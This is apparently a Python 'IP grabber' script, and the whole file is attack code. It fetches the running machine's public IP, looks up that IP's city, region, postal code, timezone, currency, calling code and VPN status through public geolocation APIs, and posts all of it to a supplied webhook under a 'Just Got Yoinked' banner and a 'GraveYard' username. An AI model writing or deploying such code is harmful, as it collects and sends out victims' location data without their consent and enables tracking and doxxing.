from requests import get;import requests;import json;
ip          =    get('https://api.ipify.org').text
city        =    get(f'https://ipapi.co/{ip}/city').text 
region      =    get(f'https://ipapi.co/{ip}/region').text
postal      =    get(f'https://ipapi.co/{ip}/postal').text
timezone    =    get(f'https://ipapi.co/{ip}/timezone').text
currency    =    get(f'https://ipapi.co/{ip}/currency').text
country     =    get(f'https://ipapi.co/{ip}/country_name').text
callcode    =    get(f"https://ipapi.co/{ip}/country_calling_code").text
vpn         =    get('http://ip-api.com/json?fields=proxy').text

def 一(str):
    data = {
    (
        "content"
    ) : f"""
    **__{ip} Just Got Yoinked__**
       **__Ip Info / 👻 __**                                                                               
    > <:rip:959916670946791474> # **Country |  {country}**
    > <:rip:959916670946791474> # **City | {city}**
    > <:rip:959916670946791474> # **Region | {region}**
    > <:rip:959916670946791474> # **Postal Code | {postal}**
    > <:rip:959916670946791474> # **TimeZone |  {timezone}**
    > <:rip:959916670946791474> # **Currency |  {currency}**
    > <:rip:959916670946791474> # **CallCode | {callcode}**
    > <:rip:959916670946791474> # **VPN | {json.loads(vpn)['proxy']}**  
    """,
    "username" : 
    (
        "GraveYard // 👻"
    ),
    "avatar_url" : 
    (
        "https://i.pinimg.com/236x/2e/a4/9b/2ea49b032782f8146c58ba2abaa7114b.jpg"
    )
    }
    requests.post(str, json=data)
